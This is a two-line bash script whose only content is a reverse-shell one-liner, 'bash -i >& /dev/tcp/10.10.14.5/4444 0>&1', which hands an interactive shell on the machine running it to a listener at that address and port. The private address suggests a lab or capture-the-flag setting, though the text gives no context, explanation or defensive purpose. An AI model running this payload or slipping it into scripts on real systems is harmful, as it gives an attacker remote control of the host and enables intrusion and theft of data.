#!/bin/bash

bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
